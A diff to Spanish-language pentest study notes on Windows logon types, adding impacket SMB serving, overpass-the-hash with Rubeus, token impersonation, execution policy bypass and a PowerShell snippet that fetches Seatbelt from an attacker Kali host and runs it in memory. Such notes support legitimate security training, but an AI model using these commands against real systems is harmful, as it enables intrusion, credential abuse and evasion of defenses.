@@ -4,14 +4,17 @@
 - [[#Interactive Logon|Interactive Logon]]
 	- [[#Interactive Logon#Forzar un Logon Type2 con RunasCS|Forzar un Logon Type2 con RunasCS]]
 	- [[#Interactive Logon#Tareas programadas locales|Tareas programadas locales]]
+	- [[#Interactive Logon#Resumen Táctico para el Examen|Resumen Táctico para el Examen]]
 - [[#Create Firewall Rule|Create Firewall Rule]]
-
+- [[#Ejecutar binario en memoria|Ejecutar binario en memoria]]
+- [[#Consultar versión de Powershell|Consultar versión de Powershell]]
+- [[#Execution Policy|Execution Policy]]
 
 ## Create Credential object
 
 ```powershell
-$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
-$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
+$password = ConvertTo-SecureString "password" -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential("user", $password)
 ```
 
 ## Create PS Drive
@@ -22,6 +25,10 @@ net use /user:user j: \\ip\smbFolder password
 
 ```powershell
 New-PSDrive -Name J -PSProvider FileSystem -Root "\\ip\smbFolder" -Credential $cred -Persist
+```
+
+```bash
+sudo smbserver.py -smb2support share . -username user -password password
 ```
 
 ## Run cmd as other user
@@ -51,6 +58,14 @@ type C:\Windows\Tasks\services.txt
 schtasks /delete /tn "EnumServicios" /f
 ```
 
+### Resumen Táctico para el Examen
+
+- ¿Tengo la **contraseña en claro** y estoy atrapado en WinRM? Usa **`runascs.exe`** para forzar un Logon Type 2 local.
+    
+- ¿Solo tengo el **Hash NTLM** y quiero saltarme el Double-Hop de WinRM? Usa **`Rubeus asktgt`** (Overpass-the-Hash) para generar un Logon Type 9.
+    
+- ¿Soy **Administrador local** pero mi token de WinRM está restringido para la red? Busca procesos de otros usuarios en ejecución e **impersonitas sus tokens** con Mimikatz o Incognito.
+
 ## Create Firewall Rule
 
 ```powershell
@@ -61,4 +76,35 @@ Disallow
 
 ```powershell
 Remove-NetFirewallRule -DisplayName "8080-In"
+```
+
+## Ejecutar binario en memoria
+
+```powershell
+# Ejemplo conceptual para cargar Seatbelt en memoria vía HTTP sin tocar disco:
+$bytes = (New-Object System.Net.WebClient).DownloadData('http://<tu-IP-Kali>/Seatbelt.exe')
+[System.Reflection.Assembly]::Load($bytes)
+[Seatbelt.Program]::Main("all")
+```
+
+## Consultar versión de Powershell
+
+Rápido
+```powershell
+$PSVersionTable.CLRVersion
+```
+
+Consulta exacta
+```powershell
+Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full" -Name Release -ErrorAction SilentlyContinue
+
+```
+
+## Execution Policy
+
+Bypass Execution Policy
+
+```
+Set-ExecutionPolicy unrestricted|Bypass
+Set-ExecutionPolicy Bypass -Scope Process
 ```
